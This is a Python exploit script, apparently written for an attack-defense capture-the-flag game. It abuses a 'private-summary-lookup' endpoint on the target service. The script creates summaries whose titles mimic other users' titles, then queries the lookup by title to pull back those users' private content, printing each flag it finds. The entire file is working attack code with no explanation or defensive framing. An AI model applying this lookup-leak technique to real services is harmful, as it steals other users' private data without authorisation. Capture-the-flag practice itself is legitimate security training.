#!/usr/bin/env python3
import secrets

import requests

from common import FLAG, TIMEOUT, account, classify, create_summary, report, target


def exploit(service, session, identifier, preview):
    title = preview["title"].split("-", 1)[0] + "-probe" + secrets.token_hex(5)
    create_summary(session, service, title, "Lookup-" + secrets.token_hex(12), "Draft", secrets.token_hex(32))
    response = session.get(
        service + "/vodokanal/hs/api/v1/private-summary-lookup",
        params={"title": title},
        timeout=TIMEOUT,
    )
    if response.status_code != 200:
        return
    found = response.json()
    flag = found.get("content")
    if found.get("id") == identifier and isinstance(flag, str) and FLAG.fullmatch(flag):
        print(flag, flush=True)


def main():
    try:
        service, identifiers = target()
        if not identifiers:
            return
        session, _, _ = account(service)
        summaries, _ = classify(session, service, identifiers)
    except (KeyError, ValueError, RuntimeError, requests.RequestException) as error:
        report("setup", error)
        return
    for identifier, preview in summaries:
        try:
            exploit(service, session, identifier, preview)
        except (KeyError, ValueError, RuntimeError, requests.RequestException) as error:
            report(identifier, error)


if __name__ == "__main__":
    main()
